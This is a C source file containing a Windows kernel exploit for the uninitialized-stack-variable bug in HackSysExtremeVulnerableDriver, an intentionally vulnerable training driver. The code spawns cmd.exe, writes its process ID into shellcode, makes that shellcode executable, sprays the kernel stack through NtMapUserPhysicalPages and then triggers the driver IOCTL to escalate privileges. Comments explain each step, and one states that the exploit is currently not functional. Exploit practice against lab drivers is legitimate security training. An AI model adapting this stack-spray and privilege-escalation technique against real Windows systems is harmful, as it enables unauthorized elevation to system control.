#include "exploit.h"

// This exploit is currently not functional.
// The documentation for this exploit has been updated, to assist readers in the meantime.
int main(int argc, char** argv)
{
	// These are the stack variables that will be utilized, you'll need to take note of these.
	HANDLE h_hevd = CreateFileA(DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	HMODULE h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	NtMapUserPhysicalPages _NtMapUserPhysicalPages = 0;
	unsigned long old_protection = 0L, pid = 0L;
	STARTUPINFOA startup_info;
	PROCESS_INFORMATION process_information;
	int zero = 0, counter = 0;
	LPVOID spray_address = &shellcode;
	unsigned long long pfns[4096];

	// Zero out the memory of structures and fixed-size buffers.
	RtlSecureZeroMemory(&pfns, sizeof(pfns));
	RtlSecureZeroMemory(&startup_info, sizeof(startup_info));
	RtlSecureZeroMemory(&process_information, sizeof(process_information));
	_INPUT_DATA.magic = 0xAABBCCDD;

	printf("[!] HackSysExtremeVulnerableDriver Uninitialized Stack Variable Exploit\n[!] Lets exploit!");

	// h_hevd was set equal to the return value of CreateFileA, which will return a handle to the file, or in this case a handle to the driver.
	// If it is equal to INVALID_HANDLE_VALUE (or (HANDLE)-1), then it failed to obtain a handle to the driver, thus we cannot continue.
	if (h_hevd == (HANDLE)-1)
	{
		printf("\n[-] Failed to obtain a driver handle. Handle Value: 0x%p, Error: %d (0x%x)", h_hevd, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a driver handle. Handle Value: 0x%p", h_hevd);

	// Likewise CreateFileA, LoadLibraryA will return a handle to the library of our choosing, in this case ntdll.dll.
	// If it fails to load the library, it will return zero.
	// Note that you do not have to do h_ntdll != 0. Rather, you can simply use !h_ntdll instead, signifying that the value is zero.
	// In other words, !h_ntdll = zero, while h_ntdll = non-zero.
	if (!h_ntdll)
	{
		printf("\n[-] Failed to load ntdll.dll. Handle Value: 0x%p, Error: %d (0x%x)", h_ntdll, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Loaded ntdll.dll. Handle Value: 0x%p", h_ntdll);

	// From what I understand, the function used to spray the kernel stack with pointers is NtMapUserPhysicalPages.
	// We use GetProcAddress to use our previously obtained handle to ntdll.dll, and search for the NtMapUserPhysicalPages function.
	// If we cannot locate the function, GetProcAddress will return zero, otherwise it will return the address of the function.
	_NtMapUserPhysicalPages = (NtMapUserPhysicalPages)GetProcAddress(h_ntdll, "NtMapUserPhysicalPages");
	if (!_NtMapUserPhysicalPages)
	{
		printf("\n[-] Failed to locate NtMapUserPhysicalPages function address. Address: 0x%p, Error: %d (0x%x)", _NtMapUserPhysicalPages, GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Located NtMapUserPhysicalPages function address. Address: 0x%p", _NtMapUserPhysicalPages);

	// We need to spawn a shell, so we can obtain the process ID (PID) of the newly spawned process.
	// This will eventually be elevated.
	// If the creation of the process fails (which by all means should not), the return value is zero.
	if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", 0, 0, 0, 1, CREATE_NEW_CONSOLE, 0, 0, &startup_info, &process_information))
	{
		printf("\n[-] Failed to spawn a shell. Error: %d (0x%x)", GetLastError(), GetLastError());
		CloseHandle(process_information.hProcess);
		CloseHandle(process_information.hThread);
		unused = getchar();
		return 1;
	}
	printf("\n[+] Spawned a shell.");

	// We set our PID stack variable from before equal to the newly spawned process' PID.
	pid = process_information.dwProcessId;
	// Then set the offset of the shellcode, 27 bytes in, equal to the PID.
	// At this offset, the current value is 0x41414141; this must be changed to our PID!
	*(unsigned long*)(shellcode + 27) = pid;
	printf("\n[+] Set shellcode target process ID to %d (0x%x).", pid, pid);

	// Ensure that the kernel can read from, write to, and execute our shellcode, by protecting it with PAGE_EXECUTE_READWRITE protection.
	// If the return value of VirtualProtect is zero, then the function failed. Otherwise, the value should be non-zero.
	if (!VirtualProtect(&shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, &old_protection))
	{
		printf("\n[-] Failed to change shellcode memory protection. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Changed shellcode memory protection.");

	// Here, we build our Page Frame Number (PFN) array.
	// This exploit is designed for 64-bit, so instead of multiplying the integer i by 4, we multiply it by 8 (to represent a 64-bit integer).
	// From what I understand, the value i is multiplied by must divide evenly into 4096 bytes. 512 * 8 = 4096.
	// This also helps explain why the PFNs array is a size of 4096, which is an entire memory page worth of bytes.
	for (unsigned long long i = 0L; i < 512L; i++)
	{
		memcpy(pfns + (i * 8L), spray_address, 8);

		counter++;
		printf("\n[*] Built PFN %d. Value: 0x%p", counter, (unsigned long long*)(pfns + i));
	}
	printf("\n[+] Built Page Frame Number list.\n[!] Time to race the kernel stack...");

	// We cannot have anything else on the stack, as the stack trash may break the exploit.
	// This is the least we can do, in hopes that our stack spray will be able to spray the stack with our pointers, and redirect control flow to our shellcode.
	_NtMapUserPhysicalPages(&zero, 512, &pfns);
	DeviceIoControl(h_hevd, TARGET_IOCTL, &_INPUT_DATA, sizeof(_INPUT_DATA), 0, 0, 0, 0);

	return 0;
}